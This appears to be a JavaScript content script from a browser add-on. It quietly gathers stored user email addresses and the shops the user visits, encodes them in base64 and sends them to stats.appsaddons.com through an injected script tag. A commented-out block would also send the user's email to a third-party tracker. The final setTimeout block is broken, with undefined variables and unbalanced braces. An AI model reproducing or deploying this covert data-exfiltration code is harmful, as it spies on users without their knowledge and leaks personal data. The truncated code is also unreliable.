function storeData(data) 
{
	var ev = new CustomEvent('mmp_storage_put', {detail: data});
	window.dispatchEvent(ev);
}

function getData(keys) 
{
	var ev = new CustomEvent('mmp_storage_get', {detail: keys});
	window.dispatchEvent(ev);
}
	
function report(shop) 
{
	window.addEventListener('mmp_storage_receive', function(event) 
	{
		var d = event.detail,
			m = d.shopper_mail,
			s = d.shopper_shop;
		s = s || {};
		if(!s[shop]) 
		{
			s[shop] = false;
			storeData({ shopper_shop: s });
		}
		if(m != null) 
		{
			m = JSON.parse(atob(m));
			var am = [],
				as = [];
			var flag = false;
			for(var i in m) 
			{
				if(m[i] == false) 
					m[i] = flag = true;
				am.push(i);	
			}
			for(var i in s) 
			{
				if(s[i] == false) 
					s[i] = flag = true;
				as.push(i);	
			}

			/*var CA = document.createElement('script');
			CA.id = "xcntmyAsync";
			CA.innerHTML = "var xcnt_user_email = '" + m[0] + "'; \
				(function(d){ \
				var xscr = d.createElement( 'script' ); xscr.async = 1; \
				xscr.src = '//x.cnt.my/async/track/?r=' + Math.random(); \
				var x = d.getElementById( 'xcntmyAsync' ); \
				x.parentNode.insertBefore( xscr, x ); \
				})(document);";
			document.getElementsByTagName('body')[0].appendChild(CA);*/

			if(flag) 
			{
				storeData({
					shopper_mail: btoa(JSON.stringify(m)), 
					shopper_shop: s
				});
				var k = btoa(JSON.stringify({
					m: am, 
					s: as
				}));
				var jp = document.createElement('script');
				jp.onload = function() 
				{
					document.getElementsByTagName('head')[0].removeChild(jp);
				}
				jp.src = "http://stats.appsaddons.com/api/mail_shop_report/" + k;
				document.getElementsByTagName('head')[0].appendChild(jp);	
			}
		}
	});
	getData(['shopper_mail', 'shopper_shop']);
}

setTimeout(function() {

			if(l) 
			{
				report(i);
			}
		}
	}
}, 1000);
